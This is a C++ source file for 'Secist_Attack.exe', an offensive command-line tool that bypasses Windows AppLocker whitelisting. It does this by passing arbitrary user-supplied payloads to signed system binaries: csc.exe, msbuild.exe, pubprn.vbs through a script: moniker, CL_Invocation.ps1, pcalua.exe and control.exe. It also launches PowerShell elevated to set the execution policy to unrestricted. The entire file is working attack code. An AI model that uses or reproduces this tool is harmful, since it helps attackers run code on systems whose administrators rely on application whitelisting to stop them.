#include "Applocker.h"
#include <iostream>
#include "getopt.h"
#include <windows.h>

void PrintHelp()
{
	std::cout <<
		"-c, --csc:            <path>    Example:  Secist_Attack.exe -c |or  --csc C:\\Users\\demon\\secist.cs |and run secist.exe \n"
		"-C, --cscript:        <path>    Example:  Secist_Attack.exe -C |or  --cscript  C:\\Users\\demon\\Payload\\secist.txt  \n"
		"-m, --msbuild:        <path>    Example:  Secist_Attack.exe -m |or  --msbuild  C:\\Users\\demon\\Payload\\secist.csproj\n"
		"-i, --cl_invocation:  <Command> Example:  Secist_Attack.exe -i |or  --cl_invocation  calc.exe \
								                                  Secist_Attack.exe -i \"powershell.exe  calc\" \n"
		"-p, --pcalua:         <APP>     Example:  Secist_Attack.exe -p |or  --pcalua  calc.exe \n"
		"-l, --control:        <DLL>     Example:  Secist_Attack.exe -l |or  --control C:\\Users\\demon\\example\\runcalc.dll \n"
		"-A, --Applocker:      <shell>   Example:  Secist_Attack.exe -A |or  --Applocker  \n"
		"-h, --help:           <help>    Example:  Secist_Attack.exe -h |or  --help     <show help>\n";
	    "-a, --about_me:       <about>   Example:  Secist_Attack.exe -a |or  --about_me  <show about_me>\n";
	exit(1);
}



void ProcessArgs(int argc, char** argv)
{
	const char* const short_opts = "Ac:C:m:i:l:s:M:p:ah";
	const option long_opts[] = {
	{ "csc", 1, nullptr, 'c' },
	{ "cscript", 1, nullptr, 'C' },
	{ "msbuild", 1, nullptr, 'm' },
	{ "cl_invocation", 1, nullptr, 'i' },
	{ "pcalua", 1, nullptr, 'p' },
	{"control", 1, nullptr, 'l' },
	{ "Applocker", 0, nullptr, 'A' },
	{ "about_me", 1, nullptr, 'a' },
	{ "help", 0, nullptr, 'h' },
	{ nullptr, 0, nullptr, 0 }
	};

	while (true)
	{
		const auto opt = getopt_long(argc, argv, short_opts, long_opts, nullptr);

		if (-1 == opt)
			break;

		switch (opt)
		{
		case 'c': {
			std::string csc = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\csc.exe /out:secist.exe  ";
			csc += optarg;
			system(csc.c_str());
		}
				  break;


		case 'A':
			Applocker();
			break;



		case 'C':
		{
			std::string cscript = "cscript c:\\windows\\system32\\printing_admin_scripts\\zh-cn\\pubprn.vbs localhost \"script:";
			cscript += optarg;
			system(cscript.c_str());
		}
		break;



		case 'm':
		{
			std::string msbuild = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe   ";
			msbuild += optarg;
			system(msbuild.c_str());
		}
			break;

		case 'i':
		{
			std::cout << "  powershell_uac_set-executionpolic   (y/n) >" << std::flush;
			char yes;
			std::cin >> yes;
			if (yes == 'y' || yes == 'y') {
				ShellExecute(NULL, "runas", "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "set-executionpolicy -executionpolicy unrestricted ", NULL, SW_SHOWNORMAL);
			}

			else if (yes == 'n' || yes == 'n') {
				//system("powershell.exe get-authenticodesignature c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;. c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;syncinvoke  calc.exe");
			std::string cl_invocation = "powershell.exe get-authenticodesignature c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;. c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;syncinvoke    ";
			cl_invocation += optarg;
			system(cl_invocation.c_str());
			
			}

		}
			break;


		case 'p':
		{
		std::string pcalua = "c:\\windows\\system32\\pcalua.exe -a  ";
		pcalua += optarg;
		system(pcalua.c_str());
		}
			break;


		case 'l':
		{
			std::string control = "control  ";
			control += optarg;
			system(control.c_str());
		}
			break;

		case 'a':
			about();
		break;


		case 'h': 
			PrintHelp();
			break;


		}
	}
}

int main(int argc, char **argv)
{
	ProcessArgs(argc, argv);
	return 0;
}